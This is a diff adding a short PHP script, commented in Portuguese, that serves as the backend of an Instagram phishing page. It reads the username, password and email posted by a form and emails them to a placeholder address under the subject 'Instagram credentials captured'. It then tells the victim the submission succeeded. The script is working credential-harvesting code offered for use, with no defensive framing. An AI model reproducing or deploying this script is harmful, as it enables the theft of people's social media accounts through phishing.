@@ -1,0 +1,17 @@
+<?php
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    $email = $_POST['email'];
+
+    $to = 'sua@email.com';  // Insira seu próprio endereço de e-mail aqui
+    $subject = 'Credenciais do Instagram capturadas';
+    $body = "Nome de usuário: $username\nSenha: $password\nE-mail: $email";
+    $headers = 'From: sua@email.com' . "\r\n" .
+    'Reply-To: sua@email.com' . "\r\n" .
+    'X-Mailer: PHP/' . phpversion();
+
+    mail($to, $subject, $body, $headers);
+
+    echo "Suas credenciais foram enviadas com sucesso!";
+
+?>
